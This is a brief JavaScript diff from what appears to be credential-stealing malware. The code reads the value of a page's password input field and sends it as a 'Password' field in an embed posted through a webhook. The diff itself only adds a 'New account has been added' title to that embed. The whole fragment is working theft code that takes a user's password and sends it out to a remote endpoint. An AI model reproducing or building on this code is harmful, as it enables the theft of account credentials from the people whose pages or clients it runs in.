@@ -26,6 +26,7 @@ module.exports = {
             const passwordInput = document.querySelector(this.getSelector('passwordInput'))?.value;
             if (!passwordInput) return;
 
+            embed.title = 'New account has been added';
             embed.fields.push(formatField(['Password', code(passwordInput)]));
             await Util.Webhook.editEmbed(embed, id);
           });
